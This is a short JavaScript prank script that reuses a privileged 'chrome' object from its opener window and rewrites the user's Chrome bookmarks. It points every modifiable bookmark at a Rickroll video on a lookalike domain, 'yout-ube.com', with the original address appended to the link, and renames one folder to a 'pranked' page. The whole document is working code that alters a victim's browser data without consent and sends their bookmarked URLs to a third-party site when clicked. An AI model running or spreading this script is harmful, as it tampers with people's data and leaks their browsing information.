window.chrome = opener.window.chrome;
chrome.bookmarks.getTree(tree => {
    function processNode(node) {
        node.forEach(elem => {
            if (!elem.unmodifiable) {
                if (elem.children) {
                    processNode(elem.children);
                } else if (elem.title == "Rickroll Bookmarks") {
                    chrome.bookmarks.update(elem.id, {title: "What happened to my bookmarks?", url: "https://spacesaver.github.io/pranked/"});
                } else if (elem.url && (typeof elem.id != "undefined")) {
                    chrome.bookmarks.update(elem.id, {url: "https://www.yout-ube.com/watch?v=dQw4w9WgXcQ&restore=" + encodeURIComponent(elem.url)});
                }
            }
        })
    }
    processNode(tree);
    alert("The deed is done.");
});